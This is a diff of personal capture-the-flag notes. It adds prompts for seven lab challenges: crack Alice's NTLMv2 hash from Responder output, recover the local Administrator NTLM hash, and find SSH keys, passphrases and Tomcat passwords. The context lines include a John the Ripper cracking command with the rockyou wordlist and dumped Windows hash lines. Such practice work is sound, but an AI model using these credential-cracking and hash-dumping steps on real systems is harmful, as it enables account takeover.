@@ -1,4 +1,7 @@
 * Challenge 1
+
+Can you find Alice's password? Note refer to the attached responder output.
+
 ** Downloaded responder output txt
 ** see NTLM hash
 [HTTP] NTLMv2 Client   : 10.58.122.100
@@ -14,7 +17,10 @@ john -w=/usr/share/wordlists/rockyou.txt --format=netntlmv2 alice.ntlmv2
 
 1g 0:00:00:08 DONE (2019-06-27 10:59) 0.1145g/s 1282Kp/s 1282Kc/s 1282KC/s Eliseulove..Edward14.
 
+
 * Challenge 2 
+
+Can you find the NTLM hash for the local Administrator account? Flag format 32-hex
 
 ** Setup
 *Note* Downloaded the openvpn profiles, will use the internal profile
@@ -107,3 +113,34 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:77e0771814213b2747124b0c0fb30
 *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 
 *** Hash structure, username : something : LM hash : NTLM hash
+
+* Challenge 3
+** Description
+Edward's SSH key
+
+Find Edward's ssh private key. Flag format: There is a 32-hex key on the DEK-Info line.
+
+* Challenge 4
+
+** Description
+Tomcat password
+
+Can you get the Tomcat manager password?
+
+* Challenge 5
+** Description
+
+Bob's password
+What is Bob's password?
+
+* Challenge 6
+** Description
+Edward's passphrase
+
+What is the passphrase of Edward's ssh private key?
+
+* Challenge 7
+** Description
+Fred's password
+
+What is Fred's password to get onto the crypto server?
